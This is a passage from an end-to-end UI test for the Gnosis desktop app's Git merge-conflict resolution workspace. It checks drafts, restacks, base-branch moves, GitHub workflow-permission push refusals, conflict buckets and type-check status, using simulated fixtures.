    assert.equal(await js("document.querySelector('.restack-review > .step-card-body')?.hasAttribute('data-diff-scroller')"), true);
    // Closing must save an unreviewed paused draft; it must not lose it or publish.
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace')");
    assert.doesNotMatch(await js<string>('window.conflictFixture.restack.blocked.files[0].result'), /<{7}/);
    assert.equal(await js('window.conflictFixture.restack.blocked.files[0].resolved'), false);
    await open();
    // An edit left open and unsaved belongs to this pause. Continue pauses again on the same path in the next commit,
    // with a whole-file proposal: the editor is closed there and the earlier text is gone.
    await wait(`!!document.querySelector('.restack-conflict-file .conflict-block[data-conflict-index="0"] [data-conflict-edit]')`);
    await js(`${paused}.querySelector('.conflict-block[data-conflict-index="0"] [data-conflict-edit]').click()`);
    const pausedEditor = inlineEditor(0, paused);
    await wait(`!!${pausedEditor} && ${pausedEditor}.getRootNode().activeElement===${pausedEditor}`);
    await win.webContents.debugger.sendCommand('Input.insertText', { text: '// stale, never saved\n' });
    await wait(`!${paused}.querySelector('[data-conflict-edit-save]').disabled`);
    await click('Mark reviewed');
    await wait('window.conflictFixture.restack.blocked.files[0].resolved===true');
    await js(`(()=>{const s=window.conflictFixture,f=s.restack.blocked.files[0];
      window.nextPause={...s.restack.blocked,commit:'f'.repeat(40),reason:'The restack is paused on the next commit.',files:[{...f,result:f.original,resolved:false,proposals:undefined,verdict:undefined,picks:undefined,edits:undefined,wholeFile:{source:'mergiraf',text:f.theirs}}]};})()`);
    await click('Continue restack');
    await wait("document.querySelector('.restack-blocked p')?.textContent==='The restack is paused on the next commit.'");
    await wait(`!!${paused}.querySelector('.conflict-whole-file')`);
    assert.equal(await js("!!document.querySelector('[data-conflict-inline-edit]')"), false, 'No editor carries into the next pause');
    assert.doesNotMatch(await js<string>('window.conflictFixture.restack.blocked.files[0].result'), /stale, never saved/);
    // After Use the proposal for this file the file has no cards: Reset file brings the proposal and its conflicts back.
    await click('Use the proposal for this file');
    await wait(`!${paused}.querySelector('.conflict-whole-file') && !!${paused}.querySelector('[data-restack-reset]')`);
    await captureAll('restack-whole-file-used');
    await js(`${paused}.querySelector('[data-restack-reset]').click()`);
    await wait(`!!${paused}.querySelector('.conflict-whole-file')`);
    await click('Use the proposal for this file');
    await wait(`!${paused}.querySelector('.conflict-whole-file')`);
    await click('Mark reviewed');
    // A failed Continue keeps its error and Retry in view below 900px, where the plan's other rows step aside.
    await js("window.failContinue='GitHub did not answer.'");
    await resize(760, 800);
    await wait('innerWidth<=760');
    await click('Continue restack');
    await wait("[...document.querySelectorAll('.restack-review .step-list-error')].some(e=>e.checkVisibility())");
    assert.equal(await js(`(${visibleButton('Retry')})?.checkVisibility() ?? false`), true, 'Retry shows at 760px');
    await capture('restack-continue-failed-narrow');
    await resize(1280, 900);
    await wait('innerWidth>=1280');
    await click('Retry');
    await wait("!document.querySelector('.restack-blocked')");
    await click('Close');

    // A draft whose PR branch moved cannot be published; Load latest changes keeps what still applies.
    await js(
      "window.conflictFixture.status='editing';window.conflictFixture.stale=true;window.conflictFixture.staleReason='head-moved';window.conflictFixture.files[0].resolved=false;window.dispatchEvent(new CustomEvent('gnosis-resolve-conflicts',{detail:window.conflictFixture.url}));"
    );
    await wait(
      "document.querySelector('.conflict-footer')?.textContent.includes('Someone pushed to feature/retry after you started.')"
    );
    assert.equal(
      await js("!!document.querySelector('[data-conflict-primary]')"),
      false,
      'Only loading the latest changes continues'
    );
    assert.match(
      await js<string>("document.querySelector('.conflict-footer').textContent"),
      /Load latest changes reuses the ones that still apply/,
      'The copy names the button it offers'
    );
    assert.ok(await exists('Load latest changes'));
    assert.equal(await exists('Start over with latest code…'), false);
    await captureAll('stale');
    await resize(760, 800);
    await capture('narrow');
    assert.ok(await footerFits(), 'Footer buttons fit at 760 × 800');
    // Below 900px the file list is the picker, with the open file's status, for one file too.
    assert.equal(
      await js("document.querySelector('[data-conflict-file-picker]')?.checkVisibility() && !!document.querySelector('[data-conflict-file-picker] [data-status]')"),
      true
    );
    assert.equal(await js("document.querySelector('nav.conflict-files').checkVisibility()"), false);
    assert.ok(await js('document.documentElement.scrollWidth<=innerWidth'));
    await js('window.conflictFixture.stale=false;window.conflictFixture.staleReason=undefined');
    await click('Load latest changes');
    await wait("window.conflictCalls.at(-1).kind==='open' && window.conflictCalls.at(-1).keep===true");
    await click('Start over with latest code…');
    await wait("document.querySelector('.conflict-footer')?.textContent.includes('Cancel')");
    // Cancel has focus once the Reset menu has closed: Enter never starts over.
    await wait("document.activeElement?.closest('.conflict-footer') && document.activeElement.textContent.trim()==='Cancel'");
    await capture('start-over-narrow');
    await click('Cancel');
    await resize(1280, 900);
    await click('Close');

    // Edge screens drop the resolve controls and draft status, and name the state.
    const noResolveChrome = async () => {
      for (const selector of [
        '.conflict-files',
        '.conflict-footer',
        '.conflict-save-state',
        '[data-conflict-keys]',
        '.conflict-suggest-trigger',
      ])
        assert.equal(await js(`!!document.querySelector(${JSON.stringify(selector)})`), false, `${selector} is hidden`);
      assert.doesNotMatch(
        await js<string>("document.querySelector('.conflict-workspace').innerText"),
        /Mergiraf|agents were not used|Local draft/
      );
    };
    await js(
      "window.conflictFixture.files=[];window.conflictFixture.stale=false;window.conflictFixture.preparation='clean-merge';window.dispatchEvent(new CustomEvent('gnosis-resolve-conflicts',{detail:window.conflictFixture.url}))"
    );
    await wait("document.querySelector('.conflict-state h2')?.textContent==='Git merged everything cleanly'");
    await noResolveChrome();
    await captureAll('clean-merge');
    await click('Review and push…');
    await wait("document.querySelector('.conflict-confirm .step-card')");
    // A clean merge has nothing to decide: only main's files, open.
    assert.deepEqual(await confirmGroupsShown(), { main: { count: '2 files', open: 'true' } });
    await captureAll('clean-merge-confirm');
    await click('Close');
    await js(
      "window.conflictFixture.preparation='up-to-date';window.dispatchEvent(new CustomEvent('gnosis-resolve-conflicts',{detail:window.conflictFixture.url}))"
    );
    await wait("document.querySelector('.conflict-state h2')?.textContent==='feature/retry already includes main'");
    await noResolveChrome();
    assert.equal(await js("!!document.querySelector('.step-list,.conflict-confirm')"), false);
    await wait("document.activeElement?.textContent.trim()==='Done'");
    await captureAll('up-to-date');
    await click('Done');
    await js(
      "window.conflictFixture.preparation='clean-merge';window.conflictFixture.stale=true;window.dispatchEvent(new CustomEvent('gnosis-resolve-conflicts',{detail:window.conflictFixture.url}))"
    );
    await wait("document.querySelector('.conflict-state h2')?.textContent==='The PR changed'");
    await noResolveChrome();
    await captureAll('empty-stale');
    await click('Load latest changes');
    await wait('window.conflictCalls.at(-1).restart===true && window.conflictCalls.at(-1).keep===true');
    await click('Close');

    // Preparation shows inline progress; Activity is mentioned only when it takes a while.
    await js('window.slowOpen=7000');
    await open();
    await wait("document.querySelector('.conflict-state .loading-indicator')");
    assert.equal(
      await js("document.querySelector('.conflict-state').textContent.includes('Activity')"),
      false,
      'Activity is mentioned only after about 5 s'
    );
    await capture('preparing');
    await wait("document.querySelector('.conflict-state')?.textContent.includes('continues in Activity')");
    await wait("/^\\d+ s so far$/.test(document.querySelector('[data-conflict-elapsed]')?.textContent ?? '')");
    await capture('preparing-slow');
    await wait("!document.querySelector('.conflict-state .loading-indicator')");
    await click('Close');
    // A failed preparation explains itself; the raw output is under Details.
    await js(
      "window.slowOpen=0;window.failOpen='Git could not complete this operation. fatal: unable to read tree cccccccc'"
    );
    await open();
    await wait("document.querySelector('.conflict-state[data-state=failed] .conflict-error')");
    assert.equal(
      await js("document.querySelector('.conflict-error-title').textContent"),
      'Gnosis couldn’t prepare this merge.'
    );
    assert.ok(await exists('Try again'));
    assert.ok(await exists('Open PR on GitHub'), 'A failed preparation also points to GitHub');
    await capture('failure');
    await captureAll('prepare-failed');
    await js('window.failOpen=undefined');
    await click('Try again');
    await wait("document.querySelector('.conflict-state h2')");
    await click('Close');

    // Long script lines with commit IDs as Git labels: the view still shows branch names only.
    const command = Array.from({ length: 180 }, (_, i) => `node scripts/check-${i}.mjs`).join(' && ');
    const files = ['package.json', 'scripts/test-workbench.mjs'].map((name) => {
      const wrap = (text: string) =>
        name.endsWith('.json')
          ? `{\n  "scripts": {\n    "test": "${text}"\n  }\n}\n`
          : `export const command = ${JSON.stringify(text)};\n`;
      const base = wrap(command),
        ours = wrap(command + ' --pr'),
        theirs = wrap(command + ' --main');
      const original = `<<<<<<< ${'a'.repeat(40)}\n${ours}||||||| ${'b'.repeat(40)}\n${base}=======\n${theirs}>>>>>>> ${'c'.repeat(40)}\n`;
      return {
        path: name,
        mode: '100644',
        base,
        ours,
        theirs,
        original,
        result: original,
        resolved: false,
        source: 'manual',
      };
    });
    // The preview matches this session's files: both resolved files plus one clean change from main.
    const longPatch = files
      .map(
        (f) =>
          `diff --git a/${f.path} b/${f.path}\n--- a/${f.path}\n+++ b/${f.path}\n@@ -1 +1 @@\n-${f.ours.split('\n')[0]}\n+${f.theirs.split('\n')[0]} \n`
      )
      .join('');
    await js(
      `window.conflictPreview=${JSON.stringify(
        parsePatchFiles(longPatch + patch.slice(patch.indexOf('diff --git a/src/clock.ts'))).flatMap((p) => p.files)
      )}`
    );
    await js(
      `window.conflictFixture.files=${JSON.stringify(files)};window.conflictFixture.stale=false;window.conflictFixture.preparation='conflicts';window.dispatchEvent(new CustomEvent('gnosis-resolve-conflicts',{detail:window.conflictFixture.url}))`
    );
    await wait("document.querySelectorAll('.conflict-files button').length===2");
    await wait("document.activeElement?.closest('.conflict-block')");
    assert.equal(await js("document.querySelector('.conflict-files [aria-current=true] .conflict-path').textContent"), 'package.json');
    await key('n');
    await wait("document.querySelector('.conflict-files [aria-current=true] .conflict-path')?.textContent==='scripts/test-workbench.mjs'");
    await wait("document.activeElement?.closest('.conflict-block')");
    assert.doesNotMatch(
      await js<string>("document.querySelector('.conflict-file-pane').innerText"),
      /[0-9a-f]{40}/,
      'Commit IDs never label versions'
    );
    await wait("document.querySelector('.conflict-view diffs-container')?.shadowRoot?.querySelector('[data-line]')");
    await captureAll('long-script-conflict');
    await resize(760, 800);
    assert.ok(await footerFits(), 'Long lines never push the footer out of view');
    await resize(1280, 900);
    await key('p');
    await wait("document.querySelector('.conflict-files [aria-current=true] .conflict-path')?.textContent==='package.json'");
    await key('n');
    await wait("document.querySelector('.conflict-files [aria-current=true] .conflict-path')?.textContent==='scripts/test-workbench.mjs'");
    // Reviewing one file advances without publishing; each file keeps its own saved content.
    await wait("document.activeElement?.closest('.conflict-block')");
    await key('1');
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    assert.match(
      await js<string>("document.querySelector('[data-conflict-primary]').textContent"),
      /Mark reviewed & next file/
    );
    await key('m');
    await wait("document.querySelector('.conflict-files [aria-current=true] .conflict-path').textContent==='package.json'");
    assert.equal(await js('window.conflictFixture.files[1].resolved'), true);
    assert.equal(await js('window.conflictFixture.files[0].resolved'), false);
    await wait("document.activeElement?.closest('.conflict-block')");
    await key('2');
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    await captureAll('files-reviewed');
    // M marks the file reviewed at once: its result is in the diff, with no separate step to show it.
    await key('m');
    await wait("document.querySelector('.conflict-confirm .step-card')");
    assert.equal(await js('window.conflictFixture.files.every(f=>f.resolved)'), true);
    assert.equal(await publishes(), 2, 'File review never publishes');
    // Two Keeps, one per file; main brings src/clock.ts.
    assert.deepEqual(await confirmGroupsShown(), {
      decided: { count: '2 conflicts in 2 files', open: 'true' },
      main: { count: '1 file', open: 'false' },
    });
    assert.deepEqual(
      await js("[...document.querySelectorAll('[data-confirm-group=decided] [data-confirm-how]')].map(e=>e.textContent)"),
      ['Conflict 1 of 1 · Kept main’s change', 'Conflict 1 of 1 · Kept PR change']
    );
    // File shortcuts pause in the confirmation, and Enter never pushes.
    await key('m');
    await key('Enter');
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(await publishes(), 2, 'Neither shortcuts nor Enter push');
    // Escape cancels the workspace without pushing; the draft stays saved locally.
    await key('Escape');
    await wait("!document.querySelector('.conflict-workspace')");
    assert.equal(await publishes(), 2);

    // main moves while the user resolves: Gnosis merges it again with the saved resolutions.
    await js(`(()=>{
      // A single PR: no dependents to restack after the push.
      window.conflictFixture.dependents=[];delete window.conflictFixture.restack;
      const original=window.electronAPI.conflictResolution;
      window.electronAPI.conflictResolution=async req=>{
        const s=window.conflictFixture;const move=window.baseMove;
        if(!move||(req.kind!=='publish'&&req.kind!=='preview')||req.kind!==move.on)return original(req);
        window.conflictCalls.push(req);window.baseMove=undefined;
        if(move.kind==='head')throw Error("Error invoking remote method 'conflict-resolution': Error: The PR branch has new commits since you started. Nothing was pushed.");
        const from=s.baseSha;s.baseSha='f'.repeat(40);
        if(move.kind==='conflict'){
          // The new main commit conflicts once more in package.json; its earlier resolution stays.
          const f=s.files[0];const added='<<<<<<< '+'a'.repeat(40)+'\\n  "version": "1.1.0",\\n=======\\n  "version": "2.0.0",\\n>>>>>>> '+'f'.repeat(40)+'\\n';
          f.original=added+f.original;f.result=added+f.result;f.resolved=false;
          s.version++;return {session:structuredClone(s),baseMoved:{from,to:s.baseSha,conflicts:1,files:[f.path]}};
        }
        s.status='published';s.commitSha='d'.repeat(40);s.version++;
        return {session:structuredClone(s),baseMoved:{from,to:s.baseSha,conflicts:0,files:[]}};
      };
    })()`);
    const reviewAndPush = async () => {
      await open();
      await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='confirm'");
      await click('Review and push…');
      await wait("document.querySelector('.conflict-confirm .step-card')");
    };

    // 1. A new conflict from main: only that conflict reopens, nothing is pushed, the other file stays reviewed.
    await js("window.baseMove={on:'publish',kind:'conflict'}");
    await reviewAndPush();
    await click('Push merge commit');
    await wait("!document.querySelector('.conflict-confirm') && document.querySelector('.conflict-files')");
    assert.equal(await publishes(), 3);
    assert.equal(await js("document.querySelector('.conflict-files [aria-current=true] .conflict-path').textContent"), 'package.json');
    await wait("document.querySelectorAll('.conflict-block[data-state=open]').length===1");
    assert.equal(
      await js<string>("document.querySelector('.conflict-footer-status').textContent"),
      'main moved and brought a new conflict in package.json. Nothing was pushed. Your other resolutions are kept.'
    );
    assert.equal(await stage(), 'conflicted');
    assert.deepEqual(
      await js("[...document.querySelectorAll('.conflict-files [data-stage]')].map(e=>e.dataset.stage)"),
      ['conflicted', 'reviewed'],
      'Only the file with the new conflict needs work'
    );
    assert.doesNotMatch(await js<string>("document.querySelector('.conflict-view').innerText"), /<{7}|>{7}/);
    await captureAll('base-moved-new-conflict');
    await js("document.querySelector('.conflict-block[data-state=open] [data-choice=theirs]').click()");
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    await click('Mark reviewed');
    await wait("document.querySelector('.conflict-confirm .step-card')");
    assert.match(await js<string>('window.conflictFixture.files[0].result'), /"version": "2.0.0"/);
    await click('Close');

    // 2. main moved again with no new conflict: the push goes ahead and says so in one line.
    await js("window.baseMove={on:'publish',kind:'clean'}");
    await reviewAndPush();
    await click('Push merge commit');
    await wait("document.querySelector('.conflict-outcome h2')?.textContent==='feature/retry updated'");
    assert.equal(await publishes(), 4);
    assert.equal(
      await js<string>("document.querySelector('.conflict-outcome [data-base-moved]').textContent"),
      'main moved while you worked, so the merge commit includes its latest changes. Your resolutions still applied.'
    );
    await captureAll('base-moved-pushed');
    await click('Done');

    // 3. Someone pushed to the PR: blocked, and the recovery is the button the copy names.
    await js(
      "Object.assign(window.conflictFixture,{status:'editing',commitSha:undefined});window.conflictFixture.files.forEach(f=>f.resolved=true);window.baseMove={on:'preview',kind:'head'}"
    );
    await open();
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='confirm'");
    await click('Review and push…');
    await wait("document.querySelector('.conflict-footer-status[data-error]')");
    assert.equal(
      await js<string>("document.querySelector('.conflict-footer-status[data-error]').textContent"),
      'Someone pushed to feature/retry after you started. Nothing was pushed. Your resolutions are saved. Select Load latest changes to merge the new commits; resolutions that still apply are reused.'
    );
    assert.equal(await exists('Review and push…'), false, 'Publishing stays blocked');
    assert.ok(await footerFits());
    await captureAll('head-moved');
    await click('Load latest changes');
    await wait(
      "window.conflictCalls.at(-1).kind==='open' && window.conflictCalls.at(-1).restart===true && window.conflictCalls.at(-1).keep===true"
    );
    assert.equal(await publishes(), 4, 'A blocked publish never pushes');
    await click('Close');

    // 4. The resolution changes a GitHub Actions workflow and the sign-in has repo and read:org, not workflow. GitHub
    // would refuse the push, so the confirmation says why, keeps Push disabled and signs in again with one click.
    const workflowPatch =
      'diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1 +1 @@\n-  node-version: 20\n+  node-version: 22\n';
    const refusal = `Error invoking remote method 'conflict-resolution': Error: Git could not complete this operation. To https://github.com/klang/engine.git\n ! [remote rejected] ${'d'.repeat(40)} -> feature/retry (refusing to allow an OAuth App to create or update workflow \`.github/workflows/ci.yml\` without \`workflow\` scope)\nerror: failed to push some refs`;
    await js(`(()=>{
      Object.assign(window.conflictFixture,{status:'editing',commitSha:undefined,stale:false});
      window.conflictFixture.files.forEach(f=>f.resolved=true);
      window.conflictPreview=[...window.conflictPreview,...${JSON.stringify(parsePatchFiles(workflowPatch).flatMap((p) => p.files))}];
      const inner=window.electronAPI.conflictResolution;
      window.electronAPI.conflictResolution=async req=>{
        if(req.kind==='publish'&&window.refuseWorkflow){window.conflictCalls.push(req);throw Error(${JSON.stringify(refusal)});}
        return inner(req);
      };
      window.signInStarts=0;
      const begin=window.electronAPI.beginGitHubSignIn;
      window.electronAPI.beginGitHubSignIn=(...args)=>{window.signInStarts++;return begin(...args)};
      const complete=window.electronAPI.completeGitHubSignIn;
      window.electronAPI.completeGitHubSignIn=async(...args)=>{await new Promise(r=>window.authorizeSignIn=r);return complete(...args)};
      window.setFixtureGitHubScopes(['repo','read:org']);
    })()`);
    await reviewAndPush();
    const warning = "document.querySelector('.conflict-confirm [data-workflow-push-warning] .github-scope-prompt')";
    await wait(`!!${warning}`);
    assert.equal(
      await js(`${warning}.querySelector('p').textContent`),
      'This resolution changes GitHub Actions workflows (.github/workflows/…). GitHub only accepts pushes that change workflows from sign-ins with the workflow permission.'
    );
    assert.ok(await js(`(${visibleButton('Push merge commit')}).disabled`), 'Push waits for the workflow permission');
    await captureAll('workflow-permission');
    await js(`[...${warning}.querySelectorAll('button')].find(b=>b.textContent.trim()==='Sign in again').click()`);
    await wait("document.querySelector('.github-auth-dialog [aria-label=\"GitHub sign-in code\"]')?.textContent==='TEST-CODE'");
    assert.equal(await js('window.signInStarts'), 1, 'One click starts sign-in');
    assert.ok(await js("!!document.querySelector('.conflict-workspace')"), 'The workspace stays open behind sign-in');
    await capture('workflow-permission-sign-in');
    await js('window.authorizeSignIn();window.authorizeSignIn=undefined');
    // GitHub authorizes the new scopes, including workflow: Push is available again, nothing was pushed meanwhile.
    await wait("!document.querySelector('.github-auth-dialog')");
    await wait(`!${warning}`);
    await wait(`!(${visibleButton('Push merge commit')}).disabled`);
    assert.equal(await publishes(), 4);

    // GitHub refuses the push anyway, as it does for a token that reports no scopes: the same plain message and
    // Sign in again, not Git's words. The resolutions stay; nothing is reopened.
    await js("window.refuseWorkflow=true;window.setFixtureGitHubScopes(null,'fine-grained')");
    await click('Push merge commit');
    await wait("document.querySelector('.conflict-confirm .conflict-error')");
    assert.equal(await publishes(), 5);
    assert.equal(await js("document.querySelector('.conflict-error-title').textContent"), 'Needs the workflow permission.');
    const refusedText = await js<string>(
      "[...document.querySelectorAll('.conflict-error > div > p')].map(p=>p.textContent).join(' ')"
    );
    assert.match(
      refusedText,
      /This resolution changes GitHub Actions workflows \(\.github\/workflows\/…\)\. GitHub only accepts pushes that change workflows from sign-ins with the workflow permission\. Nothing was pushed\. Your resolutions are saved\./
    );
    assert.doesNotMatch(refusedText, /refusing to allow|remote rejected|Git could not/);
    assert.match(await js<string>("document.querySelector('.conflict-error-details pre').textContent"), /refusing to allow an OAuth App/);
    assert.ok(await js(`(${visibleButton('Push merge commit')}).disabled`), 'A refused push is never replayed on its own');
    assert.ok(await exists('Sign in again'));
    assert.equal(await js('window.conflictFixture.files.every(f=>f.resolved)'), true, 'Resolutions are kept');
    assert.equal(await js("window.conflictCalls.at(-1).kind"), 'publish', 'Nothing reopened or discarded the draft');
    await captureAll('workflow-push-refused');
    await click('Sign in again');
    await wait("typeof window.authorizeSignIn==='function' && document.querySelector('.github-auth-dialog [aria-label=\"GitHub sign-in code\"]')");
    await js('window.authorizeSignIn();window.authorizeSignIn=undefined');
    await wait("!document.querySelector('.github-auth-dialog')");
    await wait(`!(${visibleButton('Push merge commit')}).disabled`);
    assert.equal(await js("!!document.querySelector('.conflict-confirm .conflict-error')"), false);
    await js('window.refuseWorkflow=false');
    await click('Push merge commit');
    await wait("document.querySelector('.conflict-outcome h2')?.textContent==='feature/retry updated'");
    assert.equal(await publishes(), 6);
    await click('Done');

    // Buckets: preparation's proposals are checked with tree-sitter. Merged is collapsed, Check shows why, Decide is
    // what is left. A proposal that loses main's new function stays in Check.
    const three = 'export function three() {\n  return 3;\n}\n\n';
    const four = 'export function four() {\n  return 4;\n}\n\n';
    const two = 'export function two() {\n  return 2;\n}\n';
    const retry = {
      path: 'src/retry.ts',
      base: `export function one() {\n  return 1;\n}\n\n${two}`,
      ours: `export function one() {\n  return 10;\n}\n\n${three}${two}`,
      theirs: `export function one() {\n  return 11;\n}\n\n${four}${two}`,
      original: `export function one() {\n<<<<<<< feature/retry\n  return 10;\n||||||| ancestor\n  return 1;\n=======\n  return 11;\n>>>>>>> main\n}\n\n<<<<<<< feature/retry\n${three}||||||| ancestor\n=======\n${four}>>>>>>> main\n${two}`,
      proposals: [null, { source: 'mergiraf', text: three }],
      source: 'mergiraf',
    };
    // Each side adds an import at its own place, after and before a: both sides inserting at one place would be Check
    // since #476.
    const imports = {
      path: 'src/imports.ts',
      base: `import { a } from './a';\n\n${two}`,
      ours: `import { a } from './a';\nimport { b } from './b';\n\n${two}`,
      theirs: `import { c } from './c';\nimport { a } from './a';\n\n${two}`,
      original: `<<<<<<< feature/retry\nimport { a } from './a';\nimport { b } from './b';\n||||||| ancestor\nimport { a } from './a';\n=======\nimport { c } from './c';\nimport { a } from './a';\n>>>>>>> main\n\n${two}`,
      proposals: [{ source: 'mergiraf', text: "import { c } from './c';\nimport { a } from './a';\nimport { b } from './b';\n" }],
      source: 'mergiraf',
    };
    const notes = {
      path: 'docs/notes.md',
      base: 'a\n',
      ours: 'b\n',
      theirs: 'c\n',
      original: '<<<<<<< feature/retry\nb\n||||||| ancestor\na\n=======\nc\n>>>>>>> main\n',
      proposals: [{ source: 'rerere', text: 'b\nc\n' }],
      source: 'rerere',
    };
    const withResult = (f: { original: string; proposals: ({ text: string } | null)[] }) => ({
      ...f,
      mode: '100644',
      resolved: false,
      result: ((index) => f.original.replace(/<<<<<<<[\s\S]*?>>>>>>> main\n/g, (raw) => f.proposals[index++]?.text ?? raw))(0),
    });
    // Each conflict's bucket as the main process saves it when it counts them as shown (lib/conflict-stats.ts).
    const counted = (
      [
        [retry, ['decide', 'check']],
        [imports, ['merged']],
        [notes, ['merged']],
      ] as const
    ).map(([f, buckets]) => ({
      ...withResult(f),
      statsBlocks: blockFingerprints(f.original).map((key, i) => ({ key, bucket: buckets[i] })),
    }));
    await js(`(()=>{
      Object.assign(window.conflictFixture,{status:'editing',commitSha:undefined,stale:false,version:1,restack:undefined,dependents:[],files:${JSON.stringify(counted)}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait(
      "document.querySelector('[data-conflict-summary]')?.textContent==='3 files have conflicts. 2 of 4 conflicts are merged and checked. 2 need you: 1 to check, 1 to decide.'"
    );
    const showMerged = "[...document.querySelectorAll('.conflict-summary-notes label')].find(l=>l.textContent.includes('Review Merged-only files myself'))?.querySelector('input')";
    assert.equal(await js(`${showMerged}.checked`), true, 'Merged conflicts still show for review by default');
    assert.deepEqual(
      await js("[...document.querySelectorAll('.conflict-files button small')].map(s=>s.textContent)"),
      ['1 to decide1 to check', '1 merged', '1 merged']
    );
    await checksDone();
    assert.equal(await js(`${block(0)}.dataset.state`), 'open');
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-block-header').textContent`), /Decide/);
    assert.equal(await js(`${block(1)}.dataset.bucket`), 'check');
    assert.match(
      await js<string>(`${block(1)}.querySelector('.conflict-block-header').textContent`),
      /^Conflict 2 of 2Checkexport function four\(\) \{ from main is missing from the result\./
    );
    // The opt-in type check (#445 item 24): one line in the summary for each state. Off, there is none.
    assert.equal(await js("!!document.querySelector('.conflict-type-check')"), false, 'Off by default: no line');
    const typeCheckShows = async (state: unknown, line: string | null) => {
      await js(
        `(()=>{window.typeCheckState=${JSON.stringify(state)};for(const cb of window.typeCheckListeners)cb(window.conflictFixture.id);})()`
      );
      await wait(
        line === null
          ? "!document.querySelector('.conflict-type-check')"
          : `document.querySelector('.conflict-type-check')?.firstChild?.textContent===${JSON.stringify(line)}`
      );
    };
    await typeCheckShows({ state: 'running' }, 'Type check: running…');
    await captureAll('type-check-running');
    await click('Stop');
    assert.equal(await js('window.typeCheckCancels'), 1, 'Stop cancels the check');
    await typeCheckShows({ state: 'cancelled' }, 'Type check: stopped');
    const keyOf = (f: (typeof counted)[number]) => typeCheckKey(f as Parameters<typeof typeCheckKey>[0]);
    const checked = Object.fromEntries(counted.map((f) => [(f as unknown as { path: string }).path, keyOf(f)]));
    await typeCheckShows({ state: 'passed', preExisting: 0, checked }, 'Type check: passed');
    // A pass for an earlier draft is never shown as passed for this one; nor while your changes settle.
    await typeCheckShows({ state: 'passed', preExisting: 0, checked: { ...checked, 'src/imports.ts': 'earlier' } }, 'Type check: waiting for your changes');
    await typeCheckShows({ state: 'waiting' }, 'Type check: waiting for your changes');
    await typeCheckShows(
      { state: 'skipped', reason: 'dependencies aren’t installed in your clone' },
      'Type check: skipped (dependencies aren’t installed in your clone)'
    );
    // A check that couldn't run says what decided Merged instead.
    assert.equal(
      await js(`${note('type-check-unavailable')}?.textContent`),
      'The type check didn’t run on this draft. Merged results passed the other checks.'
    );
    await captureAll('type-check-skipped');
    // New errors: the compiler checks the whole program, so every Merged conflict in the PR is Check, with the first
    // error as the note. A result for this draft only: every file's key is the one it checked.
    const typeNote = 'The type check found 2 new errors, the first in src/imports.ts:3 (TS2305).';
    await typeCheckShows(
      {
        state: 'errors',
        count: 2,
        preExisting: 1,
        errors: ["src/imports.ts:3 TS2305 Module './b' has no exported member 'b'.", "src/use.ts:1 TS2322 Type 'string' is not assignable to type 'number'."],
        checked,
        files: counted.map((f) => ({ path: (f as unknown as { path: string }).path, key: keyOf(f), note: typeNote })),
      },
      'Type check: 2 new errors'
    );
    await wait(
      "document.querySelector('[data-conflict-summary]')?.textContent==='3 files have conflicts. 4 need you: 3 to check, 1 to decide.'"
    );
    assert.deepEqual(
      await js("[...document.querySelectorAll('.conflict-files button small')].map(s=>s.textContent)"),
      ['1 to decide1 to check', '1 to check', '1 to check']
    );
    await js("document.querySelector('.conflict-type-check-detail').focus()");
    await wait("document.querySelector('.conflict-type-check-errors')?.textContent.includes('src/use.ts:1 TS2322')");
    assert.match(
      await js<string>("document.querySelector('.conflict-type-check-errors').textContent"),
      /Any new error keeps every merged conflict in Check: an error in one file can come from a conflict in another\..*Not counted: 1 error the PR or its base already has\./
    );
    await captureAll('type-check-errors');
    await js(`${block(0)}.focus()`);
    await wait("!document.querySelector('.conflict-type-check-errors')");
    // Back to off for the steps below: the summary counts the Merged conflict again.
    await typeCheckShows(null, null);
    await wait(
      "document.querySelector('[data-conflict-summary]')?.textContent==='3 files have conflicts. 2 of 4 conflicts are merged and checked. 2 need you: 1 to check, 1 to decide.'"
    );
    // J and K visit both conflicts that need you: the one to decide and the one to check.
    await js(`${block(0)}.focus()`);
    await key('j');
    assert.equal(await activeBlock(), '1');
    await captureAll('buckets-check');

    // Compare with: PR · main · both (#445 item 9). In every mode the Decide and the Check card stay on screen, under
    // their own lines, and Decide says nothing is chosen. The choice is remembered for the session.
    const pressed = () => js<string | null>("document.querySelector('.conflict-compare [aria-pressed=true]')?.dataset.compare ?? null");
    const compareWith = async (mode: string) => {
      await js(`document.querySelector('.conflict-compare [data-compare=${mode}]').click()`);
      await wait(`document.querySelector('.conflict-compare [data-compare=${mode}]')?.getAttribute('aria-pressed')==='true'`);
    };
    /**
     * The diff line right above a card is one of its conflict's lines: the card is under its lines, not elsewhere. Lines
     * are read in the diffs' shadow roots; in split layout both columns' rows at that height count.
     */
    const cardUnder = (index: number, lines: string[]) =>
      js<true | string>(`(()=>{
        const card=${block(index)};if(!card||!card.checkVisibility())return 'card '+${index}+' is not shown';
        card.scrollIntoView({block:'center'});
        const top=card.getBoundingClientRect().top;
        const rows=[...card.closest('.conflict-diff-view').querySelectorAll('diffs-container')].flatMap(h=>[...(h.shadowRoot?.querySelectorAll('[data-line]')??[])]);
        const above=rows.map(r=>({t:(r.querySelector('[data-column-content]')??r).textContent.replace(/\\n$/,''),b:r.getBoundingClientRect()})).filter(x=>x.b.height>0&&x.b.bottom<=top+1);
        if(!above.length)return 'no line above card '+${index};
        const bottom=Math.max(...above.map(x=>x.b.bottom));
        const nearest=above.filter(x=>x.b.bottom>=bottom-2).map(x=>x.t);
        const want=${JSON.stringify(lines)};
        return nearest.some(t=>want.includes(t))||'card '+${index}+' sits under '+JSON.stringify(nearest)+', not '+JSON.stringify(want);
      })()`);
    const decideSaysNothing = async () =>
      assert.match(await js<string>(`${block(0)}.querySelector('.conflict-diff-legend').textContent`), /Nothing is chosen yet\.$/);
    const threeLines = ['export function three() {', '  return 3;', '}', ''];
    assert.equal(await pressed(), 'pr', 'PR is the default');
